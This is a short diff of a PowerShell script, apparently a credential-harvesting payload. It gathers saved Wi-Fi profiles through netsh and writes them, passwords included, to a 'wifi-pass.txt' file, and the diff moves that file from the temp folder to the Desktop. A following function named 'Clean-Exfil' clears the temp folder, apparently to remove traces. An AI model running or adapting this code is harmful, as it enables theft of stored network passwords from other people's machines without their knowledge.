@@ -11,7 +11,8 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-O
     }
 } | Format-Table -AutoSize | Out-String
 
-$wifiProfiles | Out-File -FilePath $env:TEMP/--wifi-pass.txt
+$filePath = "$env:USERPROFILE\Desktop\wifi-pass.txt"
+$wifiProfiles | Out-File -FilePath $filePath
 
 function Clean-Exfil {
     # 清空临时文件夹
